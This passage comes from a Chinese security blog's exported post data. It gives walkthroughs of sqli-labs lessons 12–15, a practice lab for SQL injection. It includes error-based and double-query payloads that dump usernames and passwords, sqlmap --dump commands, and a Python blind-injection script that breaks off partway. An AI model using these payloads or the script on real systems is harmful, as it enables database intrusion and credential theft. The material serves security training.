alt=\"20\"></p>\n"},{"title":"sqli-labs-lession 12 基于错误的POST双引号字符型注入","date":"2018-09-27T05:38:47.000Z","_content":"# sqli-labs-lession 12 基于错误的POST双引号字符型注入 #\n---\n## 登录界面 ##\n\n![1](/img/sql/Lesson-12/1.png)\n\n## 注入过程 ##\n\n根据标题知道这一课和上一课区别只在引号,来判断一下类型。\n\n![2](/img/sql/Lesson-12/2.png)\n\n没有反应,尝试`\"`\n\n![3](/img/sql/Lesson-12/3.png)\n\n获得报错信息\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1\") LIMIT 0,1' at line 1`\n\n根据报错信息得知它是双引号加括号闭合。在hackbar中添加`)`和`#`注释。\n\n`uname=1\") order by 100#&passwd=1&submit=Submit`\n\n![4](/img/sql/Lesson-12/4.png)\n\n接下来操作跟Lesson-11一样,详细的看Lesson-11。\n\n{% post_link sqli-labs-lession-11-基于错误的POST单引号字符型注入 查看Lesson-11%}","source":"_posts/sqli-labs-lession-12-基于错误的POST双引号字符型注入.md","raw":"---\ntitle: sqli-labs-lession 12 基于错误的POST双引号字符型注入\ndate: 2018-09-27 13:38:47\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs-lession 12 基于错误的POST双引号字符型注入 #\n---\n## 登录界面 ##\n\n![1](/img/sql/Lesson-12/1.png)\n\n## 注入过程 ##\n\n根据标题知道这一课和上一课区别只在引号,来判断一下类型。\n\n![2](/img/sql/Lesson-12/2.png)\n\n没有反应,尝试`\"`\n\n![3](/img/sql/Lesson-12/3.png)\n\n获得报错信息\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1\") LIMIT 0,1' at line 1`\n\n根据报错信息得知它是双引号加括号闭合。在hackbar中添加`)`和`#`注释。\n\n`uname=1\") order by 100#&passwd=1&submit=Submit`\n\n![4](/img/sql/Lesson-12/4.png)\n\n接下来操作跟Lesson-11一样,详细的看Lesson-11。\n\n{% post_link sqli-labs-lession-11-基于错误的POST单引号字符型注入 查看Lesson-11%}","slug":"sqli-labs-lession-12-基于错误的POST双引号字符型注入","published":1,"updated":"2019-06-19T17:23:13.385Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istco001u4dsbszpo9dus","content":"<h1 id=\"sqli-labs-lession-12-基于错误的POST双引号字符型注入\"><a href=\"#sqli-labs-lession-12-基于错误的POST双引号字符型注入\" class=\"headerlink\" title=\"sqli-labs-lession 12 基于错误的POST双引号字符型注入\"></a>sqli-labs-lession 12 基于错误的POST双引号字符型注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-12/1.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>根据标题知道这一课和上一课区别只在引号,来判断一下类型。</p>\n<p><img src=\"/img/sql/Lesson-12/2.png\" alt=\"2\"></p>\n<p>没有反应,尝试<code>&quot;</code></p>\n<p><img src=\"/img/sql/Lesson-12/3.png\" alt=\"3\"></p>\n<p>获得报错信息</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&quot;) LIMIT 0,1&#39; at line 1</code></p>\n<p>根据报错信息得知它是双引号加括号闭合。在hackbar中添加<code>)</code>和<code>#</code>注释。</p>\n<p><code>uname=1&quot;) order by 100#&amp;passwd=1&amp;submit=Submit</code></p>\n<p><img src=\"/img/sql/Lesson-12/4.png\" alt=\"4\"></p>\n<p>接下来操作跟Lesson-11一样,详细的看Lesson-11。</p>\n<a href=\"/2018/09/27/sqli-labs-lession-11-基于错误的POST单引号字符型注入/\" title=\"查看Lesson-11\">查看Lesson-11</a>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-12-基于错误的POST双引号字符型注入\"><a href=\"#sqli-labs-lession-12-基于错误的POST双引号字符型注入\" class=\"headerlink\" title=\"sqli-labs-lession 12 基于错误的POST双引号字符型注入\"></a>sqli-labs-lession 12 基于错误的POST双引号字符型注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-12/1.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>根据标题知道这一课和上一课区别只在引号,来判断一下类型。</p>\n<p><img src=\"/img/sql/Lesson-12/2.png\" alt=\"2\"></p>\n<p>没有反应,尝试<code>&quot;</code></p>\n<p><img src=\"/img/sql/Lesson-12/3.png\" alt=\"3\"></p>\n<p>获得报错信息</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&quot;) LIMIT 0,1&#39; at line 1</code></p>\n<p>根据报错信息得知它是双引号加括号闭合。在hackbar中添加<code>)</code>和<code>#</code>注释。</p>\n<p><code>uname=1&quot;) order by 100#&amp;passwd=1&amp;submit=Submit</code></p>\n<p><img src=\"/img/sql/Lesson-12/4.png\" alt=\"4\"></p>\n<p>接下来操作跟Lesson-11一样,详细的看Lesson-11。</p>\n<a href=\"/2018/09/27/sqli-labs-lession-11-基于错误的POST单引号字符型注入/\" title=\"查看Lesson-11\">查看Lesson-11</a>"},{"title":"sqli-labs-lession 13 POST单引号双注入变形","date":"2018-09-27T06:01:58.000Z","_content":"# sqli-labs-lession 13 POST单引号双注入变形 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-13/1.png)\n\n## 手注 ##\n\n### 判断类型 ###\n\n`'`检验是否报错\n\n![2](/img/sql/Lesson-13/2.png)\n\n返回报错信息\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''') and password=('') LIMIT 0,1' at line 1`\n\n根据报错信息,很明显和Lesson-12课一样变量应该像`('$uname')`闭合起来。经过检验发现输入不存在的账号密码只会显示登录失败图片,登录成功也只显示成功图片。这里可以利用像Lesson-5一样利用报错显示信息。\n\n### 获取字段数 ###\n\nhackbar又不好用了。又要在表单里输入...\n\n`xxx') order by 100#`\n\n![3](/img/sql/Lesson-13/3.png)\n\n`xxx') order by 2#`\n\n无错误信息\n\n![4](/img/sql/Lesson-13/4.png)\n\n字段数为2。\n\n### 获取数据库 ###\n\n* extractvalue\n\n函数解释：\n\nextractvalue()：从目标XML中返回包含所查询值的字符串。\n　　\nEXTRACTVALUE (XML_document, XPath_string); \n\n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc \n\n第二个参数：XPath_string (Xpath格式的字符串)\n\nconcat:返回结果为连接参数产生的字符串。\n\nextract的第二个参数要求是xpath格式字符串,当输入xpath格式字符串就会报错,并把错误原因显示。但是限制长度是32位。\n\n`xxx') and extractvalue(null,concat(0x7e,(select database()),0x7e))#`\n\n![5](/img/sql/Lesson-13/5.png)\n\n### 获取表 ###\n\n`xxx') and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#`\n\n![6](/img/sql/Lesson-13/6.png)\n\n### 获取列 ###\n\n`xxx') and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))#`\n\n![7](/img/sql/Lesson-13/7.png)\n\n### 获取值 ###\n\n`xxx') and extractvalue(null,concat(0x7e,(select group_concat(username,':',password) from security.users),0x7e))#`\n\n![8](/img/sql/Lesson-13/8.png)\n\n这个时候这个函数的弊端就显示出来了,只显示了32个字符长度的信息。\n\n修改payload。\n\n`xxx') union select count(*),concat((floor(rand(0)*2)),'--',(select concat(username,':',password) from security.users limit 0,1))a from information_schema.tables group by a#`\n\n![9](/img/sql/Lesson-13/9.png)\n\n逐行查看。\n\n## SQLMAP ##\n\nfirefox设置代理,再用Burpsuite抓包。\n\n--technique E \n\n使用报错型注入\n\n`sqlmap -r sqlpost/post13.txt -p uname --dbs --threads 10 --technique E`\n\n![10](/img/sql/Lesson-13/10.png)\n\n`sqlmap -r sqlpost/post13.txt -p uname -D security -T users --columns --dump`\n\n![11](/img/sql/Lesson-13/11.png)\n\n\n\n\n\n\n\n\n","source":"_posts/sqli-labs-lession-13-POST单引号双注入变形.md","raw":"---\ntitle: sqli-labs-lession 13 POST单引号双注入变形\ndate: 2018-09-27 14:01:58\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs-lession 13 POST单引号双注入变形 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-13/1.png)\n\n## 手注 ##\n\n### 判断类型 ###\n\n`'`检验是否报错\n\n![2](/img/sql/Lesson-13/2.png)\n\n返回报错信息\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''') and password=('') LIMIT 0,1' at line 1`\n\n根据报错信息,很明显和Lesson-12课一样变量应该像`('$uname')`闭合起来。经过检验发现输入不存在的账号密码只会显示登录失败图片,登录成功也只显示成功图片。这里可以利用像Lesson-5一样利用报错显示信息。\n\n### 获取字段数 ###\n\nhackbar又不好用了。又要在表单里输入...\n\n`xxx') order by 100#`\n\n![3](/img/sql/Lesson-13/3.png)\n\n`xxx') order by 2#`\n\n无错误信息\n\n![4](/img/sql/Lesson-13/4.png)\n\n字段数为2。\n\n### 获取数据库 ###\n\n* extractvalue\n\n函数解释：\n\nextractvalue()：从目标XML中返回包含所查询值的字符串。\n　　\nEXTRACTVALUE (XML_document, XPath_string); \n\n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc \n\n第二个参数：XPath_string (Xpath格式的字符串)\n\nconcat:返回结果为连接参数产生的字符串。\n\nextract的第二个参数要求是xpath格式字符串,当输入xpath格式字符串就会报错,并把错误原因显示。但是限制长度是32位。\n\n`xxx') and extractvalue(null,concat(0x7e,(select database()),0x7e))#`\n\n![5](/img/sql/Lesson-13/5.png)\n\n### 获取表 ###\n\n`xxx') and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#`\n\n![6](/img/sql/Lesson-13/6.png)\n\n### 获取列 ###\n\n`xxx') and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))#`\n\n![7](/img/sql/Lesson-13/7.png)\n\n### 获取值 ###\n\n`xxx') and extractvalue(null,concat(0x7e,(select group_concat(username,':',password) from security.users),0x7e))#`\n\n![8](/img/sql/Lesson-13/8.png)\n\n这个时候这个函数的弊端就显示出来了,只显示了32个字符长度的信息。\n\n修改payload。\n\n`xxx') union select count(*),concat((floor(rand(0)*2)),'--',(select concat(username,':',password) from security.users limit 0,1))a from information_schema.tables group by a#`\n\n![9](/img/sql/Lesson-13/9.png)\n\n逐行查看。\n\n## SQLMAP ##\n\nfirefox设置代理,再用Burpsuite抓包。\n\n--technique E \n\n使用报错型注入\n\n`sqlmap -r sqlpost/post13.txt -p uname --dbs --threads 10 --technique E`\n\n![10](/img/sql/Lesson-13/10.png)\n\n`sqlmap -r sqlpost/post13.txt -p uname -D security -T users --columns --dump`\n\n![11](/img/sql/Lesson-13/11.png)\n\n\n\n\n\n\n\n\n","slug":"sqli-labs-lession-13-POST单引号双注入变形","published":1,"updated":"2019-06-19T17:23:13.385Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istcq001z4dsb20jkkkw7","content":"<h1 id=\"sqli-labs-lession-13-POST单引号双注入变形\"><a href=\"#sqli-labs-lession-13-POST单引号双注入变形\" class=\"headerlink\" title=\"sqli-labs-lession 13 POST单引号双注入变形\"></a>sqli-labs-lession 13 POST单引号双注入变形</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-13/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>&#39;</code>检验是否报错</p>\n<p><img src=\"/img/sql/Lesson-13/2.png\" alt=\"2\"></p>\n<p>返回报错信息</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p>\n<p>根据报错信息,很明显和Lesson-12课一样变量应该像<code>(&#39;$uname&#39;)</code>闭合起来。经过检验发现输入不存在的账号密码只会显示登录失败图片,登录成功也只显示成功图片。这里可以利用像Lesson-5一样利用报错显示信息。</p>\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p>hackbar又不好用了。又要在表单里输入…</p>\n<p><code>xxx&#39;) order by 100#</code></p>\n<p><img src=\"/img/sql/Lesson-13/3.png\" alt=\"3\"></p>\n<p><code>xxx&#39;) order by 2#</code></p>\n<p>无错误信息</p>\n<p><img src=\"/img/sql/Lesson-13/4.png\" alt=\"4\"></p>\n<p>字段数为2。</p>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><ul>\n<li>extractvalue</li>\n</ul>\n<p>函数解释：</p>\n<p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>　　<br>EXTRACTVALUE (XML_document, XPath_string); </p>\n<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </p>\n<p>第二个参数：XPath_string (Xpath格式的字符串)</p>\n<p>concat:返回结果为连接参数产生的字符串。</p>\n<p>extract的第二个参数要求是xpath格式字符串,当输入xpath格式字符串就会报错,并把错误原因显示。但是限制长度是32位。</p>\n<p><code>xxx&#39;) and extractvalue(null,concat(0x7e,(select database()),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-13/5.png\" alt=\"5\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p><code>xxx&#39;) and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-13/6.png\" alt=\"6\"></p>\n<h3 id=\"获取列\"><a href=\"#获取列\" class=\"headerlink\" title=\"获取列\"></a>获取列</h3><p><code>xxx&#39;) and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-13/7.png\" alt=\"7\"></p>\n<h3 id=\"获取值\"><a href=\"#获取值\" class=\"headerlink\" title=\"获取值\"></a>获取值</h3><p><code>xxx&#39;) and extractvalue(null,concat(0x7e,(select group_concat(username,&#39;:&#39;,password) from security.users),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-13/8.png\" alt=\"8\"></p>\n<p>这个时候这个函数的弊端就显示出来了,只显示了32个字符长度的信息。</p>\n<p>修改payload。</p>\n<p><code>xxx&#39;) union select count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1))a from information_schema.tables group by a#</code></p>\n<p><img src=\"/img/sql/Lesson-13/9.png\" alt=\"9\"></p>\n<p>逐行查看。</p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>firefox设置代理,再用Burpsuite抓包。</p>\n<p>–technique E </p>\n<p>使用报错型注入</p>\n<p><code>sqlmap -r sqlpost/post13.txt -p uname --dbs --threads 10 --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-13/10.png\" alt=\"10\"></p>\n<p><code>sqlmap -r sqlpost/post13.txt -p uname -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-13/11.png\" alt=\"11\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-13-POST单引号双注入变形\"><a href=\"#sqli-labs-lession-13-POST单引号双注入变形\" class=\"headerlink\" title=\"sqli-labs-lession 13 POST单引号双注入变形\"></a>sqli-labs-lession 13 POST单引号双注入变形</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-13/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>&#39;</code>检验是否报错</p>\n<p><img src=\"/img/sql/Lesson-13/2.png\" alt=\"2\"></p>\n<p>返回报错信息</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p>\n<p>根据报错信息,很明显和Lesson-12课一样变量应该像<code>(&#39;$uname&#39;)</code>闭合起来。经过检验发现输入不存在的账号密码只会显示登录失败图片,登录成功也只显示成功图片。这里可以利用像Lesson-5一样利用报错显示信息。</p>\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p>hackbar又不好用了。又要在表单里输入…</p>\n<p><code>xxx&#39;) order by 100#</code></p>\n<p><img src=\"/img/sql/Lesson-13/3.png\" alt=\"3\"></p>\n<p><code>xxx&#39;) order by 2#</code></p>\n<p>无错误信息</p>\n<p><img src=\"/img/sql/Lesson-13/4.png\" alt=\"4\"></p>\n<p>字段数为2。</p>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><ul>\n<li>extractvalue</li>\n</ul>\n<p>函数解释：</p>\n<p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>　　<br>EXTRACTVALUE (XML_document, XPath_string); </p>\n<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </p>\n<p>第二个参数：XPath_string (Xpath格式的字符串)</p>\n<p>concat:返回结果为连接参数产生的字符串。</p>\n<p>extract的第二个参数要求是xpath格式字符串,当输入xpath格式字符串就会报错,并把错误原因显示。但是限制长度是32位。</p>\n<p><code>xxx&#39;) and extractvalue(null,concat(0x7e,(select database()),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-13/5.png\" alt=\"5\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p><code>xxx&#39;) and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-13/6.png\" alt=\"6\"></p>\n<h3 id=\"获取列\"><a href=\"#获取列\" class=\"headerlink\" title=\"获取列\"></a>获取列</h3><p><code>xxx&#39;) and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-13/7.png\" alt=\"7\"></p>\n<h3 id=\"获取值\"><a href=\"#获取值\" class=\"headerlink\" title=\"获取值\"></a>获取值</h3><p><code>xxx&#39;) and extractvalue(null,concat(0x7e,(select group_concat(username,&#39;:&#39;,password) from security.users),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-13/8.png\" alt=\"8\"></p>\n<p>这个时候这个函数的弊端就显示出来了,只显示了32个字符长度的信息。</p>\n<p>修改payload。</p>\n<p><code>xxx&#39;) union select count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1))a from information_schema.tables group by a#</code></p>\n<p><img src=\"/img/sql/Lesson-13/9.png\" alt=\"9\"></p>\n<p>逐行查看。</p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>firefox设置代理,再用Burpsuite抓包。</p>\n<p>–technique E </p>\n<p>使用报错型注入</p>\n<p><code>sqlmap -r sqlpost/post13.txt -p uname --dbs --threads 10 --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-13/10.png\" alt=\"10\"></p>\n<p><code>sqlmap -r sqlpost/post13.txt -p uname -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-13/11.png\" alt=\"11\"></p>\n"},{"title":"sqli-labs-lession 14 POST双引号双注入变形","date":"2018-09-27T12:40:43.000Z","_content":"# sqli-labs-lession 14 POST双引号双注入变形 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-14/1.png)\n\n## 注入过程 ##\n\n和上一课其实原理一样,检查注入类型即可。\n\n输入`'`号，被吃掉了。`')`也不行。来一个`\"`\n\n![2](/img/sql/Lesson-14/2.png)\n\n把上一课的payload改个引号拿来用。\n\n`xxx\" union select count(*),concat((floor(rand(0)*2)),'--',(select concat(username,':',password) from security.users limit 0,1))a from information_schema.tables group by a#`\n\n具体细节看Lesson-13\n\n{% post_link sqli-labs-lession-13-POST单引号双注入变形 查看Lesson-13%}","source":"_posts/sqli-labs-lession-14-POST双引号双注入变形.md","raw":"---\ntitle: sqli-labs-lession 14 POST双引号双注入变形\ndate: 2018-09-27 20:40:43\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs-lession 14 POST双引号双注入变形 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-14/1.png)\n\n## 注入过程 ##\n\n和上一课其实原理一样,检查注入类型即可。\n\n输入`'`号，被吃掉了。`')`也不行。来一个`\"`\n\n![2](/img/sql/Lesson-14/2.png)\n\n把上一课的payload改个引号拿来用。\n\n`xxx\" union select count(*),concat((floor(rand(0)*2)),'--',(select concat(username,':',password) from security.users limit 0,1))a from information_schema.tables group by a#`\n\n具体细节看Lesson-13\n\n{% post_link sqli-labs-lession-13-POST单引号双注入变形 查看Lesson-13%}","slug":"sqli-labs-lession-14-POST双引号双注入变形","published":1,"updated":"2019-06-19T17:23:13.385Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istcr00204dsb4ciez32q","content":"<h1 id=\"sqli-labs-lession-14-POST双引号双注入变形\"><a href=\"#sqli-labs-lession-14-POST双引号双注入变形\" class=\"headerlink\" title=\"sqli-labs-lession 14 POST双引号双注入变形\"></a>sqli-labs-lession 14 POST双引号双注入变形</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-14/1.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>和上一课其实原理一样,检查注入类型即可。</p>\n<p>输入<code>&#39;</code>号，被吃掉了。<code>&#39;)</code>也不行。来一个<code>&quot;</code></p>\n<p><img src=\"/img/sql/Lesson-14/2.png\" alt=\"2\"></p>\n<p>把上一课的payload改个引号拿来用。</p>\n<p><code>xxx&quot; union select count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1))a from information_schema.tables group by a#</code></p>\n<p>具体细节看Lesson-13</p>\n<a href=\"/2018/09/27/sqli-labs-lession-13-POST单引号双注入变形/\" title=\"查看Lesson-13\">查看Lesson-13</a>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-14-POST双引号双注入变形\"><a href=\"#sqli-labs-lession-14-POST双引号双注入变形\" class=\"headerlink\" title=\"sqli-labs-lession 14 POST双引号双注入变形\"></a>sqli-labs-lession 14 POST双引号双注入变形</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-14/1.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>和上一课其实原理一样,检查注入类型即可。</p>\n<p>输入<code>&#39;</code>号，被吃掉了。<code>&#39;)</code>也不行。来一个<code>&quot;</code></p>\n<p><img src=\"/img/sql/Lesson-14/2.png\" alt=\"2\"></p>\n<p>把上一课的payload改个引号拿来用。</p>\n<p><code>xxx&quot; union select count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1))a from information_schema.tables group by a#</code></p>\n<p>具体细节看Lesson-13</p>\n<a href=\"/2018/09/27/sqli-labs-lession-13-POST单引号双注入变形/\" title=\"查看Lesson-13\">查看Lesson-13</a>"},{"title":"sqli-labs lession 15 POST单引号布尔型时间盲注","date":"2018-09-27T13:11:20.000Z","_content":"# sqli-labs lession 15 POST单引号布尔型时间盲注 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-15/1.png)\n\n## 注入 ##\n\n尝试各种姿势都不行,应该要用时间盲注了\n\n### 判断类型 ###\n\n`admin' and if(1,sleep(60),null)#`\n\n测试出类型为字符型\n\n![2](/img/sql/Lesson-15/2.png)\n\n### Payload ###\n\n构造好了之后就和Lesson-9一样了。\n\n{% post_link sqli-labs-lession-9-GET单引号基于时间盲注 查看Lesson-9%}\n\n### 脚本 ###\n\n拿之前写的垃圾脚本改一改,跑下。(有空了把脚本改进下。)\n\n\timport requests\n\turl = 'http://10.60.250.66/sqlilabs/Less-15/'\n\tuname = \"\"\n\tdb_name = ''#security'#数据库名\n\tdb_len = 0#8 #当前数据库长度\n\ttable_num = 0 #4#数据库表数目\n\ttable_names = '' #数据表名\n\ttable_lenlist = []#[6, 8, 7, 5] #数据表名长度列表\n\ttable_namelist = []#['emails', 'referers', 'uagents', 'users'] #数据表名列表\n\tcolumn_numlist = []#[2, 3, 4, 3] #数据表列数\n\tcolumn_lenlist = []#[2, 8, 8] #列名长度列表\n\tcolumn_namelist = []#['id', 'username', 'password'] #列名列表\n\tdump_numlist = []#[13, 13, 13] #字段数量列表\n\tdb_payload = ''\n\ti = j = k = l = m = 0\n\t\n\tleft = 97\n\tright = 123\n\tprint(\"获取数据库长度\")\n\tfor i in range(1, 32):\n\t    uname = \"admin'  and length(database())=%d # \" %i\n\t    data = {'uname': uname, 'passwd': 'admin'}\n\t    res = requests.post(url, data)\n\t    if \"flag.jpg\" in res.text:\n\t        print(\"[+]数据库长度为:\" + str(i) + \"位\")\n\t        break\n\tdb_len = i\n\t\n\tprint(\"获取数据库名\")\n\tfor i in range(1, db_len+1):\n\t    for j in range(left, right):\n\t        uname = \"admin' and ('%s' = mid(database(),1,%d)) # \" % (db_name+chr(j), i)\n\t        # print(uname)\n\t        data = {'uname': uname, 'passwd': 'admin'}\n\t        res = requests.post(url, data)\n\t        # print(res.text)\n\t        if \"flag.jpg\" in res.text:\n\t            db_name += chr(j)\n\t            print(\"[-]当前猜解:\" + db_name)\n\t            break\n\tprint(\"[+]当前数据库:\" + db_name)\n\t\n\t#数据库中表数目\n\tprint(\"获取表数目....\")\n\tfor i in range(1,100):\n\t    uname = \"admin' and %d=(select count(table_name) from information_schema.tables where table_schema='%s') # \" % (i, db_name)\n\t    #print(uname)\n\t    data = {'uname': uname, 'passwd': 'admin'}\n\t    res = requests.post(url, data)\n\t    if \"flag.jpg\" in res.text:\n\t        table_num = i\n\t        break\n\tprint(\"[+]数据库表数目:\", table_num)\n\t\n\t#数据库中表长度\n\tprint(\"获取表名长度....\")\n\tfor i in range(table_num):\n\t    table_len = 0 #表名长度\n\t    #获取数据表长度\n\t    for j in range(1, 21):\n\t        uname = \"admin' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1)) # \" % (db_name, i, j)\n\t        data = {'uname': uname, 'passwd': 'admin'}\n\t        #print(uname)\n\t        res = requests.post(url, data)\n\t        if \"slap.jpg\" in res.text:\n\t            table_len = j - 1\n\t            table_lenlist.append(table_len)\n\t            break\n\tprint('[+]表名长度：', table_lenlist)\n\t\n\t#数据库表名\n\tprint(\"获取表名....\")\n\tfor i in range(table_num):\n\t    # 获取数据表名\n\t    table_names = ''\n\t    for j in range(1, table_lenlist[i]+1):\n\t        for k in range(left, right):\n\t            uname = \"admin' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))=%d # \" % (db_name, i, j, k)\n\t            #print(uname)\n\t            data = {'uname': uname, 'passwd': 'admin'}\n\t            res = requests.post(url, data)\n\t            if \"flag.jpg\" in res.text:\n\t                table_names += chr(k)\n\t                print(\"[-]当前表名猜解：\", table_names)\n\t                break\n\t    table_namelist.append(table_names)\n\tprint(\"[+]表名:\\n\", table_namelist)\n\t\n\t#数据列数\n\tprint(\"获取列数...\")\n\tfor i in range(table_num):\n\t    #print(i)\n\t    column_num = 0\n\t    for j in range(1, 21):\n\t        uname = \"admin' and %d=(select count(column_name) from information_schema.columns where table_name='%s') # \" % (j, table_namelist[i])\n\t        #print(uname)\n\t        data = {'uname': uname, 'passwd': 'admin'}\n\t        res = requests.post(url, data)\n\t        if \"flag.jpg\" in res.text:\n\t            column_num = j\n\t            #print(\"[+]\"+table_namelist[i]+\"表列数:\"+ str(column_num))\n\t            column_numlist.append(column_num)\n\t            break\n\tprint(\"[+]数据表列数\\n\", column_numlist)\n\t\n\t#猜解列长度\n\tprint(\"获取列名长度....\")\n\tfor i in range(column_numlist[3]):\n\t    column_len = 0 #列名长度\n\t     #获取列长度\n\t    for j in range(1, 21):\n\t        uname = \"admin' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1)) # \" % (i, j)\n\t        #print(uname)\n\t        data = {'uname': uname, 'passwd': 'admin'}\n\t        res = requests.post(url, data)\n\t        if 